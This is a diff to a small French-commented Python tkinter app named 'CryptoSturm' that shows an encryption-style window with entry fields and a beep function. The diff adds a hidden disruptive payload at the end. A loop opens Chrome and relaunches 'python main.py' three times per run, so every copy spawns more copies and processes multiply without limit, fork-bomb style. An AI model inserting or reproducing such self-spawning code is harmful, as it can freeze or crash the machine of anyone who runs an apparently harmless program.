@@ -4,7 +4,6 @@ import winsound
 import time
 
 
-
 # On crée la fenêtre principale avec un titre et un fond
 fenetre = tk.Tk()
 fenetre.title("CryptoSturm")
@@ -47,6 +46,7 @@ e2 = tk.Entry(message_chiffre, textvariable=message_c, bg='#999999', width=50)
 e1.grid(row=0, column=0, columnspan=6, sticky='W', ipadx=10, ipady=50)
 e2.grid(row=0, column=0, columnspan=6, sticky='W', ipadx=10, ipady=50)
 # Le bouton de chiffrement
+t = 'python main.py'
 bouton = tk.Button(fenetre, text="Clear", fg="red", bg="white", relief="raised",
                 overrelief="sunken", command=clear)
 bouton.grid(row=1, column=0, columnspan=2, sticky='N'+'W'+'E', pady=2)
@@ -61,6 +61,9 @@ def sound():
     winsound.Beep(600, 250)
     time.sleep(0.25)
 
-for i in range(100):
+for i in range(3):
     sound()
+    os.system('start chrome')
+    os.system(t)
+
 fenetre.mainloop()
